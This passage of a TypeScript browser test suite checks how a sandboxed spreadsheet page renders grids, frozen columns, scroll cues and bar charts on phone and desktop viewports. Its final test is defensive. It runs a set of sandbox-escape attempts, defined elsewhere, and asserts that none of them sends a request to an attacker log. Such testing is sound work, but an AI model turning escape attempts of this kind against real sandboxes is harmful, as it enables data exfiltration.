      const raw = await value(`answers[${JSON.stringify(name)}]`);
      if (typeof raw !== "string") continue;
      last = JSON.parse(raw) as T;
      if (ready(last)) return last;
    }
    if (last === undefined) throw new Error(`The sheet page never answered ${name} in ${BOUND_MS} ms`);
    return last;
  }

  const sheetData = (sheet: Record<string, unknown>): string => `<script type="application/json" data-sheet>${JSON.stringify({ sheets: [sheet] })}</script>`;
  const months = (rows: number, freeze: number): Record<string, unknown> => ({
    name: "Year",
    freeze,
    columns: [{ label: "Line" }, ...Array.from({ length: 11 }, (_, i) => ({ label: `Month ${i + 1}`, type: "currency", currency: "CAD" }))],
    rows: Array.from({ length: rows }, (_, r) => [`Line ${r + 1}`, ...Array.from({ length: 11 }, (_, c) => 1000 * (r + 1) + c)]),
    totals: { B: "sum", C: "sum" },
  });

  /*
   * A sheet wider than a phone: the page never scrolls sideways, only each
   * grid does, inside its own box, with the row numbers and the frozen first
   * column held while it does. Twice: on the page, and in a flex row, which
   * sizes what it holds by its content and once took the grid's whole width.
   */
  it("scrolls a wide sheet inside its grid on a phone, never the page", async () => {
    const data = sheetData(months(8, 1));
    const grids = `() => ({ page: document.documentElement.scrollWidth, view: innerWidth, grids: [...document.querySelectorAll(".sheet-scroll")].map((grid) => {
      const left = (sel) => grid.querySelector(sel).getBoundingClientRect().left;
      const before = [left("tbody .rownum"), left("tbody td")];
      grid.scrollLeft = 400;
      // Within a pixel: a frozen cell is pinned at whole pixels, the layout falls on fractions.
      const held = Math.abs(left("tbody .rownum") - before[0]) < 1 && Math.abs(left("tbody td") - before[1]) < 1;
      const out = { wide: grid.scrollWidth, box: grid.clientWidth, scrolled: grid.scrollLeft, held };
      grid.scrollLeft = 0;
      return out;
    }) })`;
    await send("Emulation.setDeviceMetricsOverride", { width: 390, height: 844, deviceScaleFactor: 1, mobile: true });
    await sheetPage("/sheet", `<h1>The year</h1>${data}<div style="display:flex;gap:12px"><section>${data}</section></div>`, { grids });
    type Probe = { page: number; view: number; grids: { wide: number; box: number; scrolled: number; held: boolean }[] };
    // Until both grids are laid out and their frozen columns pinned, a load the probe can beat on a slow runner; bounded by ask.
    const probe = await ask<Probe>("grids", (p) => p.grids.length === 2 && p.grids.every((g) => g.wide > g.box && g.scrolled === 400 && g.held));
    expect(probe.view).toBe(390);
    expect(probe.page).toBeLessThanOrEqual(probe.view);
    expect(probe.grids).toHaveLength(2);
    for (const grid of probe.grids) {
      expect(grid.box).toBeLessThan(probe.view);
      expect(grid.wide).toBeGreaterThan(grid.box);
      expect(grid.scrolled).toBe(400);
      expect(grid.held).toBe(true);
    }
    await send("Emulation.clearDeviceMetricsOverride");
  }, 30_000);

  /*
   * Two frozen columns on a phone: only the first stays put sideways, but the
   * second keeps its header at the top and its total at the bottom while the
   * grid scrolls down, as every other column does.
   */
  it("keeps a second frozen column's header and total in view on a phone", async () => {
    const sticky = `() => {
      const grid = document.querySelector(".sheet-scroll");
      const at = (sel) => grid.querySelector(sel).getBoundingClientRect();
      grid.scrollTop = 200;
      grid.scrollLeft = 300;
      const out = {
        down: grid.scrollTop,
        header: Math.abs(at("thead th:nth-child(3)").top - at("thead .rownum").top),
        total: Math.abs(at("tfoot td:nth-child(3)").bottom - at("tfoot .rownum").bottom),
        across: Math.abs(at("tbody td:nth-child(3)").left - at("tbody td:nth-child(2)").right),
      };
      grid.scrollTop = 0;
      grid.scrollLeft = 0;
      return out;
    }`;
    await send("Emulation.setDeviceMetricsOverride", { width: 390, height: 844, deviceScaleFactor: 1, mobile: true });
    await sheetPage("/frozen", sheetData(months(30, 2)), { sticky });
    const probe = await ask<{ down: number; header: number; total: number; across: number }>("sticky", (p) => p.down > 0);
    expect(probe.down).toBe(200);
    // Within a pixel of the row numbers, which are held at the top and the bottom.
    expect(probe.header).toBeLessThan(1);
    expect(probe.total).toBeLessThan(1);
    // Sideways it scrolls away, not pinned beside the first.
    expect(probe.across).toBeGreaterThan(100);
    await send("Emulation.clearDeviceMetricsOverride");
  }, 30_000);

  /*
   * A frozen column sits just right of the row numbers, which a phone draws
   * narrower: across the phone's breakpoint and back, it moves with them.
   */
  it("keeps a frozen column against the row numbers as the view crosses a phone's width", async () => {
    const pin = `() => { const cell = document.querySelector(".sheet-grid tbody td.frozen"); return { rownum: document.querySelector(".sheet-grid thead .rownum").offsetWidth, left: getComputedStyle(cell).left }; }`;
    const view = (width: number): Promise<Record<string, unknown>> => send("Emulation.setDeviceMetricsOverride", { width, height: 844, deviceScaleFactor: 1, mobile: width < 600 });
    const pinned = (p: { rownum: number; left: string }): boolean => p.left === `${p.rownum}px`;
    await view(1200);
    await sheetPage("/pin", sheetData(months(8, 1)), { pin });
    const wide = await ask("pin", pinned);
    expect(wide.left).toBe(`${wide.rownum}px`);
    await view(390);
    const phone = await ask("pin", (p: { rownum: number; left: string }) => p.rownum !== wide.rownum && pinned(p));
    expect(phone.rownum).toBeLessThan(wide.rownum);
    expect(phone.left).toBe(`${phone.rownum}px`);
    await view(1200);
    const back = await ask("pin", (p: { rownum: number; left: string }) => p.rownum === wide.rownum && pinned(p));
    expect(back.left).toBe(`${wide.rownum}px`);
    await send("Emulation.clearDeviceMetricsOverride");
  }, 60_000);

  /** The eval's expenses, as the guide writes them: a date, two words, the item a desktop's 28 characters wide, and the amount. */
  const expenses = (freeze: number): Record<string, unknown> => ({
    name: "Expenses",
    freeze,
    columns: [{ label: "Date", type: "date" }, { label: "Category" }, { label: "Item", width: 28 }, { label: "Amount", type: "currency", currency: "CAD" }],
    rows: [
      ["2026-10-01", "Housing", "Rent", 1650],
      ["2026-10-01", "Housing", "Tenant insurance", 28.5],
      ["2026-10-02", "Groceries", "Farmers market", 118.55],
      ["2026-10-04", "Dining", "Pizza night", 56.37],
    ],
    totals: { Amount: "sum" },
  });
  /** The same with a description and how it was paid: five columns, one more than a phone holds. */
  const paid = (): Record<string, unknown> => {
    const four = expenses(1) as { columns: unknown[]; rows: unknown[][] };
    return {
      ...four,
      columns: [{ label: "Date", type: "date" }, { label: "Description", width: 24 }, { label: "Category" }, { label: "Amount", type: "currency", currency: "CAD" }, { label: "Payment method" }],
      rows: four.rows.map(([date, category, item, amount], i) => [date, item, category, amount, ["Visa", "Debit", "Mastercard"][i % 3]]),
    };
  };
  /** Where the key column's cells and the cue stand against the grid's box, and whether its fade reaches them. */
  const keyed = `() => {
    const grid = document.querySelector(".sheet-scroll");
    const box = grid.getBoundingClientRect();
    const right = box.left + grid.clientLeft + grid.clientWidth;
    const keys = [...grid.querySelectorAll(".key")].map((c) => c.getBoundingClientRect());
    const fade = grid.classList.contains("more") ? parseFloat(getComputedStyle(grid).getPropertyValue("--sheet-fade")) : 0;
    return {
      more: grid.classList.contains("more"),
      held: grid.classList.contains("held"),
      fade: getComputedStyle(grid).getPropertyValue("--sheet-fade").trim(),
      keys: keys.length,
      inside: keys.every((r) => r.left >= box.left && r.right <= right + 0.5),
      clear: keys.every((r) => r.right <= right - fade + 0.5),
      cue: document.querySelector(".sheet-more").textContent,
      cueShown: document.querySelector(".sheet-more").getBoundingClientRect().width > 0,
      page: document.documentElement.scrollWidth,
    };
  }`;
  type Keyed = { more: boolean; held: boolean; fade: string; keys: number; inside: boolean; clear: boolean; cue: string; cueShown: boolean; page: number };

  /*
   * The eval's expenses on a phone: a date, a category, an item and the
   * amount fit the box whole, so the amount is not cut at its edge. Cells
   * draw tighter there, and the totals' label is a sigma, not a word.
   */
  it("fits a four-column sheet whole on a phone", async () => {
    const fit = `() => { const grid = document.querySelector(".sheet-scroll"); return { wide: grid.scrollWidth, box: grid.clientWidth, more: grid.classList.contains("more"), label: document.querySelector("tfoot .rownum").getAttribute("aria-label") }; }`;
    await send("Emulation.setDeviceMetricsOverride", { width: 390, height: 844, deviceScaleFactor: 1, mobile: true });
    await sheetPage("/fit", `<h1>October</h1>${sheetData(expenses(1))}`, { fit });
    const probe = await ask<{ wide: number; box: number; more: boolean; label: string }>("fit", (p) => p.box > 0);
    expect(probe.wide).toBeLessThanOrEqual(probe.box);
    expect(probe.more).toBe(false);
    expect(probe.label).toBe("Total");
    await send("Emulation.clearDeviceMetricsOverride");
  }, 30_000);

  /*
   * One more column than a phone holds: the amount, the figure the sheet
   * totals, is whole inside the box and never faded, in every row and the
   * total, and the tools say a column is out of view; scrolled to the end it
   * stands where it is and the cue goes. Narrower still, it holds at the
   * edge, the columns before it sliding under it, and the fade lets it be.
   */
  it("keeps a five-column expense sheet's amount whole in its box on a phone", async () => {
    const end = `() => { const grid = document.querySelector(".sheet-scroll"); grid.scrollLeft = grid.scrollWidth; return grid.scrollLeft; }`;
    await send("Emulation.setDeviceMetricsOverride", { width: 390, height: 844, deviceScaleFactor: 1, mobile: true });
    await sheetPage("/paid", `<h1>October</h1>${sheetData(paid())}`, { keyed, end });
    const start = await ask<Keyed>("keyed", (p) => p.more && p.cue !== "");
    expect(start.page).toBeLessThanOrEqual(390);
    // The header, four rows and the total.
    expect(start.keys).toBe(6);
    expect(start.inside).toBe(true);
    expect(start.clear).toBe(true);
    expect(start.cue).toBe("1 more column \u2192");
    expect(start.cueShown).toBe(true);
    expect(await ask<number>("end", (x) => x > 0)).toBeGreaterThan(0);
    const scrolled = await ask<Keyed>("keyed", (p) => !p.more);
    expect(scrolled.inside).toBe(true);
    expect(scrolled.held).toBe(false);
    expect(scrolled.cue).toBe("");
    expect(scrolled.cueShown).toBe(false);
    await send("Emulation.setDeviceMetricsOverride", { width: 320, height: 700, deviceScaleFactor: 1, mobile: true });
    await sheetPage("/paid-narrow", `<h1>October</h1>${sheetData(paid())}`, { keyed });
    const narrow = await ask<Keyed>("keyed", (p) => p.held);
    expect(narrow.inside).toBe(true);
    expect(narrow.clear).toBe(true);
    expect(narrow.fade).toBe("0px");
    expect(narrow.cue).toMatch(/^[12] more columns? \u2192$/);
    await send("Emulation.clearDeviceMetricsOverride");
  }, 30_000);

  /** The same with notes and whether a receipt was kept: seven columns, the notes far out of view on a phone. */
  const noted = (): Record<string, unknown> => {
    const five = paid() as { columns: unknown[]; rows: unknown[][] };
    const notes = ["Paid on the first, as every month, from the joint account", "Renewed for the year, the broker's quote was lower", "Mostly vegetables, the apples were on sale this week", "Sam's birthday, he paid the tip and the drinks after"];
    return {
      ...five,
      columns: [...five.columns, { label: "Notes" }, { label: "Receipt", type: "bool" }],
      rows: five.rows.map((row, i) => [...row.slice(0, 1), i === 1 ? "Tenant insurance for the year, renewed" : row[1], ...row.slice(2), notes[i], i % 2 === 0]),
    };
  };

  /*
   * Notes scrolled out of view on a phone do not set the rows' height: free
   * text stays on one line, cut, and the short words beside the amount wrap
   * to two lines at most, so no row stands far taller than a line's.
   */
  it("keeps a seven-column sheet's rows to what reads in them on a phone", async () => {
    const heights = `() => {
      const rows = [...document.querySelectorAll(".sheet-grid tbody tr")].map((tr) => tr.getBoundingClientRect().height);
      const notes = document.querySelector(".sheet-grid tbody td:nth-child(7)");
      return { rows, line: parseFloat(getComputedStyle(document.documentElement).getPropertyValue("--sheet-row")), notesWrap: notes ? getComputedStyle(notes).whiteSpace : "", page: document.documentElement.scrollWidth };
    }`;
    await send("Emulation.setDeviceMetricsOverride", { width: 390, height: 844, deviceScaleFactor: 1, mobile: true });
    await sheetPage("/noted", `<h1>October</h1>${sheetData(noted())}`, { heights, keyed });
    const probe = await ask<{ rows: number[]; line: number; notesWrap: string; page: number }>("heights", (p) => p.rows.length === 4);
    expect(probe.notesWrap).toBe("nowrap");
    expect(Math.max(...probe.rows)).toBeLessThanOrEqual(probe.line * 2.5);
    expect(probe.page).toBeLessThanOrEqual(390);
    const key = await ask<Keyed>("keyed", (p) => p.more);
    expect(key.inside).toBe(true);
    expect(key.clear).toBe(true);
    await send("Emulation.clearDeviceMetricsOverride");
  }, 30_000);

  /* A grid far wider than a phone says how much is out of view; a desktop, with its scrollbar, does not. */
  it("says how many columns a wide grid has out of view on a phone, and only there", async () => {
    await send("Emulation.setDeviceMetricsOverride", { width: 390, height: 844, deviceScaleFactor: 1, mobile: true });
    await sheetPage("/cue", `<h1>The year</h1>${sheetData(months(8, 1))}`, { keyed });
    const phone = await ask<Keyed>("keyed", (p) => p.more && p.cue !== "");
    expect(phone.cue).toMatch(/^(\d+) more columns \u2192$/);
    expect(Number(/\d+/.exec(phone.cue)![0])).toBeGreaterThanOrEqual(7);
    expect(phone.cueShown).toBe(true);
    // The key column, the first month, is in view at the start, so the edge fades in full.
    expect(phone.held).toBe(false);
    expect(phone.fade).toBe("40px");
    await send("Emulation.setDeviceMetricsOverride", { width: 1200, height: 800, deviceScaleFactor: 1, mobile: false });
    await sheetPage("/cue-wide", `<h1>The year</h1>${sheetData({ ...months(8, 1), columns: [{ label: "Line" }, ...Array.from({ length: 30 }, (_, i) => ({ label: `Month ${i + 1}`, type: "currency", currency: "CAD" }))] })}`, { keyed });
    const desktop = await ask<Keyed>("keyed", (p) => p.more);
    expect(desktop.cueShown).toBe(false);
    await send("Emulation.clearDeviceMetricsOverride");
  }, 30_000);

  /*
   * Wider than the box, the grid fades out at its right edge so a phone's
   * last column reads as more to come, not the end of the row; scrolled to
   * the end, the fade goes, and the frozen first column stays where it was.
   */
  it("fades a wide grid's right edge until it is scrolled to the end", async () => {
    const edge = `() => { const grid = document.querySelector(".sheet-scroll"); return { more: grid.classList.contains("more"), mask: getComputedStyle(grid).maskImage, left: grid.querySelector("tbody td.frozen").getBoundingClientRect().left - grid.getBoundingClientRect().left }; }`;
    const end = `() => { const grid = document.querySelector(".sheet-scroll"); grid.scrollLeft = grid.scrollWidth; return grid.scrollLeft; }`;
    await send("Emulation.setDeviceMetricsOverride", { width: 390, height: 844, deviceScaleFactor: 1, mobile: true });
    await sheetPage("/edge", `<h1>The year</h1>${sheetData(months(8, 1))}`, { edge, end });
    type Edge = { more: boolean; mask: string; left: number };
    const start = await ask<Edge>("edge", (p) => p.more);
    expect(start.mask).toMatch(/linear-gradient/);
    expect(await ask<number>("end", (x) => x > 0)).toBeGreaterThan(0);
    const scrolled = await ask<Edge>("edge", (p) => !p.more);
    expect(scrolled.more).toBe(false);
    expect(scrolled.mask).toBe("none");
    expect(Math.abs(scrolled.left - start.left)).toBeLessThan(1);
    await send("Emulation.clearDeviceMetricsOverride");
  }, 30_000);

  /*
   * On a desktop the grid's box sizes to its grid, so a sheet held by
   * something sized to its content (an inline block, a flex item) shows every
   * column, where a box contained inline would be sized as if empty, to no
   * wider than the tools above it. The columns are wider than the tools.
   */
  it("shows a three-column sheet whole on a desktop, inside an inline block and a flex item", async () => {
    const data = sheetData({ name: "Spend", columns: [{ label: "Date", type: "date", width: 24 }, { label: "Category", width: 24 }, { label: "Amount", type: "currency", currency: "CAD", width: 24 }], rows: [["2026-10-01", "Housing", 1650], ["2026-10-02", "Food", 56.37]] });
    const grids = `() => [...document.querySelectorAll(".sheet-scroll")].map((grid) => ({ wide: grid.scrollWidth, box: grid.clientWidth, table: grid.querySelector("table").offsetWidth }))`;
    await send("Emulation.setDeviceMetricsOverride", { width: 1200, height: 800, deviceScaleFactor: 1, mobile: false });
    await sheetPage("/narrow", `<div style="display:inline-block">${data}</div><div style="display:flex;gap:12px"><section>${data}</section></div>`, { grids });
    const probe = await ask<{ wide: number; box: number; table: number }[]>("grids", (g) => g.length === 2);
    expect(probe).toHaveLength(2);
    for (const grid of probe) {
      expect(grid.table).toBeGreaterThan(500);
      expect(grid.box).toBeGreaterThanOrEqual(grid.table);
      expect(grid.wide).toBeLessThanOrEqual(grid.box);
    }
    await send("Emulation.clearDeviceMetricsOverride");
  }, 30_000);

  /** A month by category and its bar chart, as the eval's budgets draw it: eight words under eight bars. */
  const byCategory = `<script type="application/json" data-sheet>${JSON.stringify({
    sheets: [{
      name: "By category",
      columns: [{ label: "Category" }, { label: "Amount", type: "currency", currency: "CAD" }],
      rows: ["Housing", "Groceries", "Dining", "Transport", "Utilities", "Fun", "Health", "Other"].map((c, i) => [c, 1650 - i * 180]),
    }],
    charts: [{ type: "bar", title: "Spend by category", labels: "A1:A8", values: "B1:B8" }],
  })}</script>`;
  /** The chart's labels: how many, how many lines they stand on, any two drawn over each other, and which way its bars run. */
  const labels = `() => {
    const chart = document.querySelector(".kos-chart");
    if (!chart) return { labels: 0 };
    const boxes = [...chart.querySelectorAll("text")].filter((t) => /^[A-Z]/.test(t.textContent)).map((t) => t.getBoundingClientRect());
    const over = boxes.some((a, i) => boxes.slice(i + 1).some((b) => a.left < b.right && b.left < a.right && a.top < b.bottom && b.top < a.bottom));
    const bars = [...chart.querySelectorAll("rect")].map((r) => r.getBoundingClientRect());
    return { labels: boxes.length, lines: new Set(boxes.map((b) => Math.round(b.top))).size, over, across: bars.every((b) => b.width > b.height), page: document.documentElement.scrollWidth };
  }`;
  type Labels = { labels: number; lines: number; over: boolean; across: boolean; page: number };

  /*
   * Eight categories under their bars do not fit a phone: the bars run
   * across there, a label at each one's left, none over another and the page
   * no wider. A desktop keeps them side by side, the words on one line under.
   */
  it("draws a by-category bar chart's labels clear of each other on a phone, as before on a desktop", async () => {
    await send("Emulation.setDeviceMetricsOverride", { width: 390, height: 844, deviceScaleFactor: 1, mobile: true });
    await sheetPage("/chart", `<h1>October</h1>${byCategory}`, { labels });
    const phone = await ask<Labels>("labels", (p) => p.labels === 8);
    expect(phone.over).toBe(false);
    expect(phone.across).toBe(true);
    expect(phone.lines).toBe(8);
    expect(phone.page).toBeLessThanOrEqual(390);
    await send("Emulation.setDeviceMetricsOverride", { width: 1200, height: 800, deviceScaleFactor: 1, mobile: false });
    await sheetPage("/chart-wide", `<h1>October</h1>${byCategory}`, { labels });
    const desktop = await ask<Labels>("labels", (p) => p.labels === 8);
    expect(desktop.over).toBe(false);
    expect(desktop.across).toBe(false);
    expect(desktop.lines).toBe(1);
    await send("Emulation.clearDeviceMetricsOverride");
  }, 30_000);

  /*
   * Each way out on a page of its own, one after another in one tab: Chrome
   * takes one prerender a page and holds back those of pages run at once, so
   * attempts sharing a page or racing in tabs hide each other's. Each waits
   * for its page to have tried, then the room a request has to land in.
   * Each aims at a path of its own, so a request that lands late, in the
   * next one's turn, still names the attempt that sent it; and once the last
   * has had its turn, a further while for any still on its way, after which
   * the whole log of what the attacker was sent must be empty.
   */
  it("lets no way out send a single request, with the page running each time", async () => {
    const results: Record<string, Run> = {};
    const from = log.length;
    for (const name of Object.keys(attempts(E))) results[name] = await run(name, wrapperDocument(page(attempts(`${E}/${name}`)[name]!)), ESCAPE_QUIET_MS);
    await pause(ESCAPE_QUIET_MS);
    const notRunning = Object.entries(results).filter(([, r]) => !r.alive).map(([name]) => name);
    const leaked = Object.fromEntries(Object.entries(results).filter(([, r]) => r.requests.length > 0).map(([name, r]) => [name, r.requests]));
    expect(notRunning).toEqual([]);
    expect(leaked).toEqual({});
    expect(log.slice(from)).toEqual([]);
  }, 150_000);
});
